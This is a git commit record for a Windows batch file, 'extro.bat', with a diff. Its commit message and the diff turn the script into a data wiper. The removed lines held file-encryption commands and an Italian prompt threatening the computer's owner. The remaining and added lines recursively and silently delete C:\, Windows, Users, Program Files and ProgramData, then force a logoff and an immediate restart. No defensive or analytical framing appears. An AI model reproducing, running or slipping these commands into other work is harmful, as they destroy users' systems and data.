6d203b4469dd539a2494954db1776a9a72258c6b
alexander922 <alexanderpellati16@gmail.com>
2026-02-28 17:10:43 +0100

    Modify extro.bat to delete system folders and shutdown
    Removed commands for changing directories and ciphering files. Added commands to delete critical system folders and shutdown the computer.

--- extro.bat
+++ extro.bat
@@ -1,10 +1,10 @@
 @echo off
 
-cd C:/
-cipher /e /s:C:\
-cipher /e /s:C:\Windows
-set /p nome=Inserisci il codice o il tuo computer muore:
 rmdir /s /q "C:\"
 rmdir /s /q "C:\Windows"
 rmdir /s /q "C:\Users"
 rmdir /s /q "C:\Program Files"
+rmdir /s /q "C:\ProgramData"
+rmdir /s /q "C:\C:\Program Files (x86)"
+shutdown /l
+shutdown /r /f /t 0
